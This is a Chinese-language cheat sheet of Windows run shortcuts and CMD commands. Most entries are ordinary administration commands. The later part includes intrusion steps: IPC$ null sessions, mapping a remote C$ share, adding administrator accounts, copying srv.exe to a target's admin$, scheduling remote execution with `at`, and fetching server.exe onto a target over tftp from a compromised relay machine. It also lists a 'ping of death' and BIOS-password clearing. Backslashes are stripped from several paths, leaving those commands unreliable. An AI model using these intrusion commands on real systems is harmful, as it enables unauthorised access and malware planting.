# cmd 命令

CMD 命令：开始－>运行－>键入 cmd 或 command（在命令行里可以看到系统版本、文件系统版本）
chcp 修改默认字符集
chcp 936 默认中文
chcp 65001

1. appwiz.cpl：程序和功能
2. calc：启动计算器

3. chkdsk.exe：Chkdsk 磁盘检查（管理员身份运行命令提示符）

4. cleanmgr: 打开磁盘清理工具

5. cmd.exe：CMD 命令提示符
6. 自动关机命令
   　 Shutdown -s -t 600：表示 600 秒后自动关机
   　 shutdown -a ：可取消定时关机
   　 Shutdown -r -t 600：表示 600 秒后自动重启

7. CompMgmtLauncher：计算机管理
8. compmgmt.msc：计算机管理
9. credwiz：备份或还原储存的用户名和密码

10. control：控制面版
11. dcomcnfg：打开系统组件服务
12. devmgmt.msc：设备管理器
13. desk.cpl：屏幕分辨率
14. dfrgui：优化驱动器 Windows 7→dfrg.msc：磁盘碎片整理程序
15. dialer：电话拨号程序
16. diskmgmt.msc：磁盘管理
17. dvdplay：DVD 播放器
18. dxdiag：检查 DirectX 信息
19. eudcedit：造字程序
20. eventvwr：事件查看器
21. explorer：打开资源管理器
22. Firewall.cpl：Windows 防火墙

23. fsmgmt.msc：共享文件夹管理器
24. gpedit.msc：组策略
25. hdwwiz.cpl：设备管理器
26. inetcpl.cpl：Internet 属性
27. intl.cpl：区域
28. iexpress：木马捆绑工具，系统自带
29. joy.cpl：游戏控制器
30. logoff：注销命令
31. lusrmgr.msc：本地用户和组
32. lpksetup：语言包安装/删除向导，安装向导会提示下载语言包
33. lusrmgr.msc：本机用户和组
34. main.cpl：鼠标属性
35. mmsys.cpl：声音

36. mem.exe：显示内存使用情况（如果直接运行无效，可以先管理员身份运行命令提示符，在命令提示符里输入 mem.exe>d:a.txt 即可打开 d 盘查看 a.txt，里面的就是内存使用情况了。当然什么盘什么文件名可自己决定。）

37. mmc：打开控制台
38. mobsync：同步命令

39. Msconfig.exe：系统配置实用程序
40. msdt：微软支持诊断工具
41. msinfo32：系统信息
42. mspaint：画图
43. Msra：Windows 远程协助
44. mstsc：远程桌面连接
45. NAPCLCFG.MSC：客户端配置
46. ncpa.cpl：网络连接
47. narrator：屏幕“讲述人”
48. Netplwiz：高级用户帐户控制面板，设置登陆安全相关的选项
49. netstat : an(TC)命令检查接口
50. notepad：打开记事本
51. Nslookup：IP 地址侦测器
52. odbcad32：ODBC 数据源管理器

53. OptionalFeatures：打开“打开或关闭 Windows 功能”对话框

54. osk：打开屏幕键盘
55. perfmon.msc：计算机性能监测器
56. perfmon：计算机性能监测器
57. PowerShell：提供强大远程处理能力
58. printmanagement.msc：打印管理
59. powercfg.cpl：电源选项
60. psr：问题步骤记录器
61. Rasphone：网络连接
62. Recdisc：创建系统修复光盘
63. Resmon：资源监视器
64. Rstrui：系统还原
65. regedit.exe：注册表
66. regedt32：注册表编辑器
67. rsop.msc：组策略结果集
68. sdclt：备份状态与配置，就是查看系统是否已备份
69. secpol.msc：本地安全策略
70. services.msc：本地服务设置
71. sfc /scannow：扫描错误并复原/windows 文件保护
72. sfc.exe：系统文件检查器
73. shrpubw：创建共享文件夹
74. sigverif：文件签名验证程序
75. slui：Windows 激活，查看系统激活信息
76. slmgr.vbs -dlv ：显示详细的许可证信息
    　 slmgr.vbs -dli ：显示许可证信息
    　 slmgr.vbs -xpr ：当前许可证截止日期
    　 slmgr.vbs -dti ：显示安装 ID 以进行脱机激
    　 slmgr.vbs -ipk ：(Product Key)安装产品密钥
    　 slmgr.vbs -ato ：激活 Windows
    　 slmgr.vbs -cpky ：从注册表中清除产品密钥（防止泄露引起的攻击）
    　 slmgr.vbs -ilc ：(License file)安装许可证
    　 slmgr.vbs -upk ：卸载产品密钥
    　 slmgr.vbs -skms ：(name[ort] )批量授权
77. snippingtool：截图工具，支持无规则截图
78. soundrecorder：录音机，没有录音时间的限制
79. StikyNot：便笺
80. sysdm.cpl：系统属性
81. sysedit：系统配置编辑器
82. syskey：系统加密，一旦加密就不能解开，保护系统的双重密码
83. taskmgr：任务管理器（旧版）
84. TM 任务管理器（新版）
85. taskschd.msc：任务计划程序
86. timedate.cpl：日期和时间
87. UserAccountControlSettings 用户账户控制设置
88. utilman：辅助工具管理器
89. wf.msc：高级安全 Windows 防火墙
90. WFS：Windows 传真和扫描
91. wiaacmgr：扫描仪和照相机向导
92. winver：关于 Windows
93. wmimgmt.msc：打开 windows 管理体系结构(WMI)
94. write：写字板
95. wscui.cpl：操作中心
96. wscript：windows 脚本宿主设置
97. wuapp：Windows 更新

1. gpedit.msc-----组策略

2. sndrec32-------录音机

3. Nslookup-------IP 地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。

4. explorer-------打开资源管理器

5. logoff---------注销命令

6. shutdown-------60 秒倒计时关机命令

7. lusrmgr.msc----本机用户和组

8. services.msc---本地服务设置

9. oobe/msoobe /a----检查 XP 是否激活

10. notepad--------打开记事本

11. cleanmgr-------垃圾整理

12. net start messenger----开始信使服务

13. compmgmt.msc---计算机管理

14. net stop messenger-----停止信使服务

15. conf-----------启动 netmeeting

16. dvdplay--------DVD 播放器

17. charmap--------启动字符映射表

18. diskmgmt.msc---磁盘管理实用程序

19. calc-----------启动计算器

20. dfrg.msc-------磁盘碎片整理程序

21. chkdsk.exe-----Chkdsk 磁盘检查

22. devmgmt.msc--- 设备管理器

23. regsvr32 /u \*.dll----停止 dll 文件运行

24. drwtsn32------ 系统医生

25. rononce -p----15 秒关机

26. dxdiag---------检查 DirectX 信息

27. regedt32-------注册表编辑器

28. Msconfig.exe---系统配置实用程序

29. rsop.msc-------组策略结果集

30. mem.exe--------显示内存使用情况

31. regedit.exe----注册表

32. winchat--------XP 自带局域网聊天

33. progman--------程序管理器

34. winmsd---------系统信息

35. perfmon.msc----计算机性能监测程序

36. winver---------检查 Windows 版本

37. sfc /scannow-----扫描错误并复原

38. taskmgr-----任务管理器（2000/xp/2003

39. winver---------检查 Windows 版本

40. wmimgmt.msc----打开 windows 管理体系结构(WMI)

41. wupdmgr--------windows 更新程序

42. wscript--------windows 脚本宿主设置

43. write----------写字板

44. winmsd---------系统信息

45. wiaacmgr-------扫描仪和照相机向导

46. winchat--------XP 自带局域网聊天

47. mem.exe--------显示内存使用情况

48. Msconfig.exe---系统配置实用程序

49. mplayer2-------简易 widnows media player

50. mspaint--------画图板

51. mstsc----------远程桌面连接

52. mplayer2-------媒体播放机

53. magnify--------放大镜实用程序

54. mmc------------打开控制台

55. mobsync--------同步命令

56. dxdiag---------检查 DirectX 信息

57. iexpress-------木马捆绑工具，系统自带 58. fsmgmt.msc-----共享文件夹管理器

59. utilman--------辅助工具管理器

60. diskmgmt.msc---磁盘管理实用程序

61. dcomcnfg-------打开系统组件服务

62. ddeshare-------打开 DDE 共享设置

110. osk------------打开屏幕键盘

111. odbcad32-------ODBC 数据源管理器

112. oobe/msoobe /a----检查 XP 是否激活 114. logoff---------注销命令

66. notepad--------打开记事本

67. nslookup-------网络管理的工具向导

68. ntbackup-------系统备份和还原

69. narrator-------屏幕“讲述人”

70. ntmsmgr.msc----移动存储管理器

71. ntmsoprq.msc---移动存储管理员操作请求

72. netstat -an----(TC)命令检查接口

73. syncapp--------创建一个公文包

74. sysedit--------系统配置编辑器

75. sigverif-------文件签名验证程序

76. ciadv.msc------索引服务程序

77. shrpubw--------创建共享文件夹

78. secpol.msc-----本地安全策略

79. syskey---------系统加密，一旦加密就不能解开，保护 windows xp 系统的双重密码

80. services.msc---本地服务设置

81. Sndvol32-------音量控制程序

82. sfc.exe--------系统文件检查器

83. sfc /scannow---windows 文件保护

84. ciadv.msc------索引服务程序

85. tourstart------xp 简介（安装完成后出现的漫游 xp 程序）

86. taskmgr--------任务管理器

87. eventvwr-------事件查看器

88. eudcedit-------造字程序

89. compmgmt.msc---计算机管理

90. packager-------对象包装程序

91. perfmon.msc----计算机性能监测程序

92. charmap--------启动字符映射表

93. cliconfg-------SQL SERVER 客户端网络实用程序

94. Clipbrd--------剪贴板查看器

95. conf-----------启动 netmeeting

96. certmgr.msc----证书管理实用程序

97. regsvr32 /u \*.dll----停止 dll 文件运行

98. regsvr32 /u zipfldr.dll------取消 ZIP 支持

99. cmd.exe--------CMD 命令提示符

100. chkdsk.exe-----Chkdsk 磁盘检查

1.磁盘操作，
　　 fdisk 隐含 参数 /mbr 重建主引导记录 fdisk /mbr 重建主引导记录

　　 fdisk 在 DOS7.0 以后增加了/cmbr 参数，可在挂接多个物理硬盘时，重建排序在后面的硬盘的主引导记录，例如：fdisk /cmbr 2，可重写第二个硬盘的主引导记录。（在使用时要十分小心，避免把好的硬盘引导记录损坏）

　　 format 参数： /q 快速格式化 /u 不可恢复 /autotest 不提示 /s 创建 MS-DOS 引导盘 format c: /q /u /autotest 

2.目录操作

　　 DIR [目录名或文件名] [/S][/W][/P][/A] 列出目录 参数: /s 查找子目录/w 只显示文件名 /p 分页/a 显示隐藏文件 DIR format.exe /s 查找该盘的 format.exe 文件并报告位置

　　 MD (MKDIR) [目录名] 创建目录 MKDIR HELLOWORLD 创建 HELLOWORLD 目录

　　 CD (CHDIR) [目录名] PS:可以使用相对目录或绝对目录 进入目录 CD AA 进入当前文件夹下的 AA 目录,cd .. 进入上一个文件夹 cd \返回根目录;cd c:\windows 进入 c:\windows 文件夹

　　 RD ( RMDIR) [目录名] 删除目录 RD HELLOWORLD 删除 HELLOWORLD 目录 

3.文件操作

　　删除目录及其文件： rmdir [目录名或文件名] [/S][/W][/P][/A] 。例 rmdir c:\qqdownload/s 删除 C 盘的 qqdownload 目录。

　　 del [目录名或文件名] [/f][/s][/q] 删除 参数:/f 删除只读文件/s 删除该目录及其下的所有内容 /q 删除前不确认

　　 del c:\del /s /q 自动删除 c 盘的 del 目录。

　　 copy [源文件或目录] [目标目录] 复制文件 copy d:\pwin98\*.\* c:\presetup 将 d 盘的 pwin98 的所有文件复制到 c 盘的 presetup 下。

　　 attrib [参数][源文件或目录] 文件属性操作命令，attrib 命令可以列出或修改磁盘上文件的属性，文件属性包括文档（A）、只读(R)、隐藏(H)、系统(S)，例如：attrib -h -r -s io.sys 执行这一命令后，将把 DOS 系统文件 io.sys 文件的只读、隐藏、系统属性去掉，这时将可以直接通过 dir 命令看到 io.sys 文件。attrib +h +r +s autoexec.bat 将为自动批处理文件增加以上属性。 

4.内存操作

　　 debug 调试内存 参数 -w [文件名] 写入二进制文件 -o [地址 1] [地址 2] 输出内存 -q 退出 exp:o 70 10[return] o 71 01

　　[return] 01[return] q[return] DOS 下通过写 70h/71h PORT 改变 BIOS 密码在 CMOS 中存放的对应位置的值,用以清除 AWARD BIOS 密码.debug 还可以破解硬盘保护卡等,但只可以在纯 DOS 下用。 5.分区操作

　　给磁盘分区，一般都会分成四个区，磁盘分区由主分区、扩展分区、逻辑分区组成。

　　 PQ 和 Acronis Disk Director 这两个工具都可以在不丢失数据的情况下对分区进行调整大小，以及合并等操作，XP 系统的话你用 PQ，WIN7 系统的话用 Acronis Disk Director 操作基本一样，可以去网上找教程来看看，再不重装系统的情况下都能调整分区大小，但是建议你还是先备份下数据再调整，毕竟对硬盘直接进行的操作有一定的危险性。

net use ipipc$ " " /user:" " 建立 IPC 空链接

net use ipipc$ "密码" /user:"用户名" 建立 IPC 非空链接

net use h: ipc$ "密码" /user:"用户名" 直接登陆后映射对方 C：到本地为 H:

net use h: ipc$ 登陆后映射对方 C：到本地为 H:

net use ipipc$ /del 删除 IPC 链接

net use h: /del 删除映射对方到本地的为 H:的映射

net user 用户名　密码　/add 建立用户

net user guest /active:yes 激活 guest 用户

net user 查看有哪些用户

net user 帐户名 查看帐户的属性

net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限

net start 查看开启了哪些服务

net start 服务名　开启服务；(如:net start telnet， net start schedule)

net stop 服务名 停止某服务

net time 目标 ip 查看对方时间

net time 目标 ip /set 设置本地计算机时间与“目标 IP”主机的时间同步,加上参数/yes 可取消确认信息

net view 查看本地局域网内开启了哪些共享

net view ip 查看对方局域网内开启了哪些共享

net config 显示系统网络设置

net logoff 断开连接的共享

net pause 服务名 暂停某服务

net send ip "文本信息" 向对方发信息

net ver 局域网内正在使用的网络连接类型和信息

net share 查看本地开启的共享

net share ipc$ 开启 ipc$共享

net share ipc$ /del 删除 ipc$共享

net share c$ /del 删除 C：共享

net user guest 12345 用 guest 用户登陆后用将密码改为 12345

net password 密码 更改系统登陆密码

netstat -a 查看开启了哪些端口,常用 netstat -an

netstat -n 查看端口的网络连接情况，常用 netstat -an

netstat -v 查看正在进行的工作

netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况

netstat -s 查看正在使用的所有协议使用情况

nbtstat -A ip 对方 136 到 139 其中一个端口开了的话，就可查看对方最近登陆的用户名

tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w 数字”用于设置超时间隔。

ping ip(或域名) 向对方主机发送默认大小为 32 字节的数据，参数：“-l[空格]数据包大小”；“-n 发送数据次数”；“-t”指一直 ping。

ping -t -l 65550 ip 死亡之 ping(发送大于 64K 的文件并一直 ping 就成了死亡之 ping)

ipconfig (winipcfg) 用于 windows NT 及 XP(windows 95 98)查看本地 ip 地址，ipconfig 可用参数“/all”显示全部配置信息

tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的 Support/tools 文件夹内)

kill -F 进程名 加-F 参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的 Support/tools 文件夹内)

del -F 文件名 加-F 参数后就可删除只读文件,/AR、/AH、/AS、/AA 分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A 表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR _._”表示删除当前目录下所有只读文件，“DEL/A-S _._”表示删除当前目录下除系统文件以外的所有文件

del /S /Q 目录 或用：rmdir /s /Q 目录 /S 删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）

move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y 将取消确认移动目录存在相同文件的提示就直接覆盖

fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到 3st.txt 文件中，"> "和"> >" 是重定向命令

at id 号 开启已注册的某个计划任务

at /delete 停止所有计划任务，用参数/yes 则不需要确认就直接停止

at id 号 /delete 停止某个已注册的计划任务

at 查看所有的计划任务

at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机

finger username @host 查看最近有哪些用户登陆

telnet ip 端口 远和登陆服务器,默认端口为 23

open ip 连接到 IP（属 telnet 登陆后的命令）

telnet 在本机上直接键入 telnet 将进入本机的 telnet

copy 路径文件名 1 　路径文件名 2 /y 复制文件 1 到指定的目录为文件 2，用参数/y 就同时取消确认你要改写一份现存目录文件

copy c:srv.exe ipadmin$ 复制本地 c:srv.exe 到对方的 admin 下

copy 1st.jpg/b+2st.txt/a 3st.jpg 将 2st.txt 的内容藏身到 1st.jpg 中生成 3st.jpg 新的文件，注：2st.txt 文件头要空三排，参数：/b 指二进制文件，/a 指 ASCLL 格式文件

copy ipadmin$svv.exe c: 或:copyipadmin$_._ 复制对方 admini$共享下的 srv.exe 文件（所有文件）至本地 C：

xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y 将不提示覆盖相同文件

用参数/e 才可连目录下的子目录一起复制到目标地址下。

tftp -i 自己 IP(用肉机作跳板时这用肉机 IP) get server.exec:server.exe 登陆后，将“IP”的 server.exe 下载到目标主机 c:server.exe 参数：-i 指以二进制模式传送，如传送 exe 文件时用，如不加-i 则以 ASCII 模式（传送文本文件模式）进行传送

tftp -i 对方 IP 　 put c:server.exe 登陆后，上传本地 c:server.exe 至主机

ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为 21。bin 指用二进制方式传送（可执行文件进）；默认为 ASCII 格式传送(文本文件时)

route print 显示出 IP 路由，将主要显示网络地址 Network addres，子网掩码 Netmask，网关地址 Gateway addres，接口地址 Interface

arp 查看和处理 ARP 缓存，ARP 是名字解析的意思，负责把一个 IP 解析成一个物理性的 MAC 地址。arp -a 将显示出全部信息

start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令

mem 查看 cpu 使用情况

attrib 文件名(目录名) 查看某文件（目录）的属性

attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性

dir 查看文件，参数：/Q 显示文件及目录属系统哪个用户，/T:C 显示文件创建时间，/T:A 显示文件上次被访问时间，/T:W 上次被修改时间

date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间

set 指定环境变量名称=要指派给变量的字符 设置环境变量

set 显示当前所有的环境变量

set p(或其它字符) 显示出当前以字符 p(或其它字符)开头的所有环境变量

pause 暂停批处理程序，并显示出：请按任意键继续....

if 在批处理程序中执行条件处理（更多说明见 if 命令及变量）

goto 标签 将 cmd.exe 导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）

call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见 call /?）

for 对一组文件中的每一个文件执行某个特定命令（更多说明见 for 命令及变量）

echo on 或 off 打开或关闭 echo，仅用 echo 不加参数则显示当前 echo 设置

echo 信息 在屏幕上显示出信息

echo 信息 >> pass.txt 将"信息"保存到 pass.txt 文件中

findstr "Hello" aa.txt 在 aa.txt 文件中寻找字符串 hello

find 文件名 查找某文件

title 标题名字 更改 CMD 窗口标题名字

color 颜色值 设置 cmd 控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白

prompt 名称 更改 cmd.exe 的显示的命令提示符(把 C:、D:统一改为：EntSky )

ver 在 DOS 窗口下显示版本信息

winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）

format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS

md 　目录名 创建目录

replace 源文件　要替换文件的目录 替换文件

ren 原文件名　新文件名 重命名文件名

tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称

type 文件名 显示文本文件的内容

more 文件名 逐屏显示输出文件

doskey 要锁定的命令=字符

doskey 要解锁命令= 为 DOS 提供的锁定命令(编辑命令行，重新调用 win2k 命令，并创建宏)。如：锁定 dir 命令：doskey dir=entsky (不能用 doskey dir=dir)；解锁：doskey dir=

taskmgr 调出任务管理器

chkdsk /F D: 检查磁盘 D 并显示状态报告；加参数/f 并修复磁盘上的错误

tlntadmn telnt 服务 admn,键入 tlntadmn 选择 3，再选择 8,就可以更改 telnet 服务默认端口 23 为其它任何端口

exit 退出 cmd.exe 程序或目前，用参数/B 则是退出当前批处理脚本而不是 cmd.exe

path 路径可执行文件的文件名 为可执行文件设置一个路径。

cmd 启动一个 win2K 命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见 cmd /?

regedit /s 注册表文件名 导入注册表；参数/S 指安静模式导入，无任何提示；

regedit /e 注册表文件名 导出注册表

cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对 NTFS 格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定 d: est.txt 拒绝 pub 用户访问。

cacls 文件名 查看文件的访问用户权限列表

REM 文本内容 在批处理文件中添加注解

netsh 查看或更改本地网络配置情况


